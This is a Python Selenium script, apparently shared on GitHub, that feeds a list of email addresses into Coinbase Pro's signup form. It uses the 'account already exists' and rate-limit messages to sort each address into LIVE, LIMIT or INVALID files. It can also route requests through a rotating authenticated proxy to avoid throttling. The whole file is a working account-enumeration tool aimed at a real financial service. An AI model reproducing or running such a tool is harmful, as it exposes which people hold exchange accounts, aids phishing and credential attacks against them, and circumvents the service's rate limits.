#!usr/bin/python
# Made with Love By Namdevel
# https://www.github.com/namdevel

import time
import os
import zipfile

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

USE_PROXY = False # True / False
PROXY_HOST = '131.153.133.18'  # rotating proxy
PROXY_PORT = 6011
PROXY_USER = 'USERNAME'
PROXY_PASS = 'PASSWORD'


manifest_json = """
{
    "version": "1.0.0",
    "manifest_version": 2,
    "name": "Chrome Proxy",
    "permissions": [
        "proxy",
        "tabs",
        "unlimitedStorage",
        "storage",
        "<all_urls>",
        "webRequest",
        "webRequestBlocking"
    ],
    "background": {
        "scripts": ["background.js"]
    },
    "minimum_chrome_version":"22.0.0"
}
"""

background_js = """
var config = {
        mode: "fixed_servers",
        rules: {
          singleProxy: {
            scheme: "http",
            host: "%s",
            port: parseInt(%s)
          },
          bypassList: ["localhost"]
        }
      };

chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

function callbackFn(details) {
    return {
        authCredentials: {
            username: "%s",
            password: "%s"
        }
    };
}

chrome.webRequest.onAuthRequired.addListener(
            callbackFn,
            {urls: ["<all_urls>"]},
            ['blocking']
);
""" % (PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS)


def get_chromedriver(use_proxy=False, user_agent=None):
    path = os.path.dirname(os.path.abspath(__file__))
    options = Options()
    if use_proxy:
        pluginfile = 'proxy_auth_plugin.zip'

        with zipfile.ZipFile(pluginfile, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)
        options.add_extension(pluginfile)
    if user_agent:
        options.add_argument('--user-agent=%s' % user_agent)
    driver = webdriver.Chrome(
        os.path.join(path, 'chromedriver'),
        options=options)
    return driver
    
with open("list.txt", "r") as f:
    text = f.readlines()
for line in text:

    os_driver = get_chromedriver(use_proxy=USE_PROXY)
    os_driver.maximize_window()

    os_driver.get("https://pro.coinbase.com/signup/idv_required")
    os_elem = WebDriverWait(os_driver, 10).until(
        EC.presence_of_element_located((By.ID, "user_first_name"))
    )
    
    #tos = os_driver.find_element_by_id("user_accepted_user_agreement").click()
    
    pw = os_driver.find_element_by_id("user_password")
    pw.send_keys("x123x")
    
    fname = os_driver.find_element_by_id("user_first_name")
    fname.send_keys("John", Keys.ARROW_RIGHT)

    lname = os_driver.find_element_by_id("user_last_name")
    lname.send_keys("Doe", Keys.ARROW_DOWN)

    email = os_driver.find_element_by_id("user_email")
    email.send_keys(line, Keys.ENTER)
    
    #submit = os_driver.find_element_by_name("commit").click()

    #os_elem = WebDriverWait(os_driver, 10).until(
    #    EC.presence_of_element_located((By.ID, "signin_button"))
    #)
    try:
        os_result = os_driver.find_element_by_class_name("flash").text
        os_check = os_driver.find_element_by_class_name("alert").text
    
        if "account already exists" in os_result:
            print(f'[LIVE] {line}')
            os_driver.quit()
            
            with open('LIVE.txt', 'a') as os_res:
                os_res.write(f"{line}\n")
        elif "attempting to create accounts too fast" in os_check:
            print(f'[RATE LIMIT] {line}')
            os_driver.quit()
            
            with open('LIMIT.txt', 'a') as os_res:
                os_res.write(f"{line}\n")
        else:
            print(f'[INVALID] {line}')
            os_driver.quit()
            with open('INVALID.txt', 'a') as os_res:
                os_res.write(f"{line}\n")

    except Exception as e:
        print(f'[ERROR] {line}')
